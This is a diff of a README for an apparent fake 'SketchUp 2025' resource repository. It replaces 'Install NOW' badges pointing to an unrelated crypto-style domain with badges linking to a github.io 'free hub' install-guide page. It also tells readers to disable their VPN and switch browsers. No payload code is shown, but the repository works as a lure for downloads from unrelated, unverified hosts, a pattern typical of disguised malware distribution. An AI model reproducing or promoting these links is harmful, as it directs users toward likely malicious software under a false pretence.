@@ -5,7 +5,10 @@
 
 **Description**: Bring your 3D design ideas to life with **SketchUp 2025**! This repository offers tutorials, resources, and tips for architects, designers, and hobbyists to explore SketchUp’s powerful tools for modeling and visualization. Start for free with accessible design tools and join our vibrant community of creators in 2025!  
 
-[![Install SketchUp 2025](https://img.shields.io/badge/Install-NOW-blueviolet)](https://ton-stake.net)  
+<a href="https://sketchup-free-hub-2025.github.io/.github/" target="_blank">
+  <img src="https://img.shields.io/badge/Install_Guide-Now-3498db" alt="Install Guide Now" width="230" height="45" style="border:none;">
+</a>
+
 
 ---
 
@@ -33,7 +36,10 @@ Get started with SketchUp 2025 effortlessly with these simple steps! 🛠️
    - Disable your VPN to avoid connection issues.  
    - Switch to another browser (e.g., Chrome, Firefox, or Edge) for a smoother experience.  
 
-[![Install SketchUp 2025](https://img.shields.io/badge/Install-NOW-blueviolet)](https://ton-stake.net)  
+<a href="https://sketchup-free-hub-2025.github.io/.github/" target="_blank">
+  <img src="https://img.shields.io/badge/Install_Guide-Now-3498db" alt="Install Guide Now" width="230" height="45" style="border:none;">
+</a>
+
 
 ---
 
@@ -90,7 +96,7 @@ Get started with SketchUp 2025 effortlessly with these simple steps! 🛠️
 ## 📸 Screenshots  
 
 **SketchUp 2025 Interface**  
-![SketchUp 2025 Interface](https://sketchup.install-download.net/images/SketchUp--5.png)  
+![SketchUp 2025 Interface](https://techfeone.net/wp-content/uploads/2023/04/Techfeone.net-SketchUp-Pro-2022-5.jpg)  
 *Intuitive workspace for 3D design.*  
 
 **Design Tools**  
